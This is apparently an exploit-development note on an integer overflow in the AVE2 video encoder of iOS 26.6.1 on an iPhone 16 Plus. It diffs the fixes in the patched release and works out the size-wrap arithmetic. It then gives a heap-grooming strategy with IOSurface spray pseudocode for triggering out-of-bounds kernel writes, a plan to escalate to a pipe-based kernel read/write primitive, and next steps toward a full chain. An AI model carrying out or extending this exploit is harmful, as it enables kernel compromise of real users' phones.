# AVE2 DPB Overflow — Heap Grooming Analysis
**Date:** 2026-11-03  
**Target:** iPhone 16 Plus (A18) · iOS 26.6.1  
**CVEs:** CVE-2026-112466/468/469/470/689

---

## 1. Patch Analysis (26.6.1 → 27.0.1)

Three independent fixes land in 27.0.1:

### Fix 1 — NTL temporal-layer integrity check (primary patch)
New assert added in 27.0.1 (absent in 26.6.1):
```
(iLayerNum == 1) || (iaCnt[1] == iTotalPendingFrameNum)
```
Catches the mismatch between configured layer count and pending frame queue
that the 32-bit size overflow exploits. Entirely absent in 26.6.1.

### Fix 2 — iLayerNum hard cap
New bounds assert (27.0.1 only):
```
0 < pInfo->sSessionCfg.sEnc.iLayerNum &&
pInfo->sSessionCfg.sEnc.iLayerNum <= ((2) < ((63+1)) ? (2) : ((63+1)))
```
Caps iLayerNum (NTL) to ≤ 2. In 26.6.1 no cap exists — arbitrary values
reach the DPB size calculation unchanged.

### Fix 3 — New AVE_CalcBufSizeOfDPB (centralised overflow-safe wrapper)
27.0.1 adds AVE_CalcBufSizeOfDPB. The vulnerable 26.6.1 AVE_CalcBufSizeOfRecon
is removed; callers migrate to the new function which checks for 32-bit
overflow before multiplying and returns an error instead of wrapping.
26.6.1 has no overflow check in the Recon allocation path.

Evidence: 27.0.1 adds "DPB size overflow" log strings with line numbers under
AVE_CalcBufSizeOfDPB. 26.6.1 has a "DPB size overflow" string only under
AVE_CalcBufSizeOfStaticAreaQPModInfo — a different subcomponent entirely.
The Recon path in 26.6.1 has no overflow logging.

---

## 2. Vulnerable Allocation — Memory Layout

### DPB surface structure (26.6.1)
Three IOSurface-backed per-frame buffers per DPB entry:
  pcaRecon[i][j][k]  — reconstruction frame (luma+chroma)
  pcaLFSResult[k]    — Low Frame Scale result  (IOSurfaceBuffer field confirmed)
  pcaLRSResult[k]    — Low Resolution Scale result (IOSurfaceBuffer field confirmed)

Each surface logs physical, kernel, and DART addresses on creation:
  FwLog %p %d | Phy 0x%lx Kernel 0x%lx DART 0x%llx | %d %d %d | %d %d

### Overflow arithmetic
  DPB_unit = 60 * 34 * 1024 = 2,088,960 bytes  (4K HEVC, 64px CTU)
  buf_size = (uint32_t)(DPB_unit * NTL)         // 32-bit truncation

  NTL=2056: 2,088,960 × 2056 = 4,294,901,760  < 2^32  → NO overflow (stall zone)
  NTL=2057: 2,088,960 × 2057 = 4,296,990,720  > 2^32  → WRAP to 2,023,424 bytes (~1.93 MB)

Firmware allocates a 1.93 MB buffer but writes as if it were 4.0 GB —
OOB overwrite of ~4 GB starting at offset +1.93 MB from allocation base.

### Allocation path
  IOSurface::allocBacking()
    → IOBufferMemoryDescriptor::inTaskWithOptions()
      → kmem_alloc_contig()   [physically contiguous, DMA-capable]

~1.93 MB is in page allocator range (above zone threshold). Pages are
physically contiguous. The firmware maps them via DART (IOMMU).

---

## 3. Heap Grooming Strategy

### Core idea
Create many same-sized (~1.93 MB) IOSurfaces from userspace, free alternate
ones to create holes, place victim objects in those holes, then trigger the
AVE2 encode at NTL=2057. The wrapped DPB allocation lands in one hole and
the OOB write hits the adjacent victim.

### Why IOSurfaceCreate works from sandbox
IOSurfaceCreate() is available sandbox-free (pure CF C API, no entitlement).
It uses the same kmem_alloc_contig path as the DPB allocation.

### Victim object (best choice): IOSurface header
- IOSurfaceGetAllocSize(surf) reads the `size` field from the kernel header
- After OOB write, a corrupted `size` field returns a detectably wrong value
- IOSurfaceGetID() reads a 32-bit ID from a fixed header offset — changes if
  the header is overwritten, provides a low-noise OOB signal

### Spray pseudocode
```python
VICTIM_SIZE = 2_023_424  # exact wrapped DPB size at NTL=2057

# Phase 1: fill allocator with same-sized surfaces
spray = [IOSurfaceCreate({'IOSurfaceAllocSize': VICTIM_SIZE}) for _ in range(64)]

# Phase 2: free alternates to create holes
for i in range(0, 64, 2):
    IOSurfaceRelease(spray[i])

# Phase 3: place victim surfaces in the holes
victims = [IOSurfaceCreate({'IOSurfaceAllocSize': VICTIM_SIZE}) for _ in range(32)]
baseline = {IOSurfaceGetID(v): IOSurfaceGetAllocSize(v) for v in victims}

# Phase 4: trigger NTL=2057 encode
#   → firmware DPB allocation lands in a freed hole
#   → OOB write hits adjacent victim header at kernel VA

# Phase 5: scan victims for corruption
for v in victims:
    if IOSurfaceGetAllocSize(v) != baseline[IOSurfaceGetID(v)]:
        print(f"KERNEL WRITE CONFIRMED at victim surface")
```

### OOB write content
The firmware writes valid DPB reconstruction data (NV12 luma/chroma planes).
Values at the OOB start (offset +1.93 MB) are the next DPB slot's header
fields — not directly attacker-controlled. To control written values: encode
a known pixel pattern with NTL=2 first, then switch to NTL=2057. The firmware
will include the known pixel data at a predictable offset into the OOB region.

### Escalation to pipe R/W (after corruption confirmed)
Replace victim IOSurface with a tagged pipe buffer. Corrupting pipe->buf_size
permits out-of-bounds pipe reads. From there: standard Siguza pipe-based
kernel R/W primitive.

---

## 4. 27.0.1 Defense-in-Depth Additions

| Addition | Purpose |
|---|---|
| AVE_IOP_CheckIdle_Boreas/Eros/Ourea | Per-chip-rev idle checks; prevent firmware stall exploitation |
| AVE_Entitlement_Check | New entitlement gate on encoder session creation |
| Mapper (was DART) abstraction | New memory management layer with unified overflow guards |
| iSize >= 0 && iSize <= 2147483647 | Explicit signed-32 bound on all size fields throughout |
| iLumaDataSize + ... <= 2147483647 | Multi-component accumulation overflow gate |

AVE_Entitlement_Check is notable: if entitlement-gating the encoder is applied
in a future 26.x patch, the NTL path may become sandbox-inaccessible before
the full chain can be built.

---

## 5. Next Steps

1. Run corrected v4 probe (NTL=2057 ladder, skip 501-2056 stall zone)
   -- file: kerneldiff/ave2_overflow_poc.py (ladder already corrected)
   -- confirms OOB write signal or crash before attempting spray

2. Implement spray + victim groom in ResearchHost offload_python context
   -- fire after NTL=2057 probe confirms fast crash (< 15s, not stall)

3. Capture FwLog DPB address output to calculate exact kernel VA of OOB start
   -- requires FwLog interception or syslog capture during encode

4. Escalate to pipe R/W once victim IOSurface header corruption is confirmed
